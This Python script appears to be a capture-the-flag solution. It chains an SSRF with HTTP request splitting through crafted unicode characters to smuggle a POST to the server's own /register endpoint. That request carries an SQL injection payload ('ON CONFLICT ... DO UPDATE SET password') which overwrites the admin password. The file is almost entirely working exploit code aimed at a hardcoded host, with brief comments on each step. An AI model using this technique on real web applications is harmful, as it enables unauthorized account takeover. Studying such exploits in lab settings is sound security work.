import requests

def ParseEncode(str: str, url: bool = False):
	"""
	@param str: string to encode
	@param url: if it should encode it for url or http
	@return str: a http/url encoded string replacing \\n \\r \' \" with respective encoding
	"""
	str = str.replace(' ', '\u0120') \
		.replace("'", "%27") \
		.replace('"', "%22") \
		.replace('\n', '\u010D\u010A')		# replace \n as \r\n http encoded
	if url:
		return str.replace(' ', "%20")		# send back %20 if url encoding
	else:
		return str.replace(' ', '\u0120')	# send back if for http encoding

url = 'http://178.62.7.184:31837/'
newAdminPassword = "asdf"

username = ParseEncode('admin', True)	# username to send
password = ParseEncode("1234') ON CONFLICT(username) DO UPDATE SET password = '{}';-- ')".format(newAdminPassword), True) # password to send, will be used to sql inject
print(password)

contentLength = len(username) + len(password) + 19	# content length of data

# endpoint that will be exploited for SSRF (Server Side Request Forgery)
endpoint = ParseEncode(
"""127.0.0.1/ HTTP/1.1
Host: 127.0.0.1

POST /register HTTP/1.1
Host: 127.0.0.1
Content-type: application/x-www-form-urlencoded
Content-Length: {}

username={}&password={}

GET /?lol=""".format(contentLength, username, password))

print (endpoint)

# send POST request to api/weather to exploit
# city and country can be what ever
r = requests.post(url + 'api/weather', json={
	'endpoint': endpoint,
	'city': 'NA',
	'country': 'NA'
})

# get message, and go see if you can access admin now with new password
print(r.text)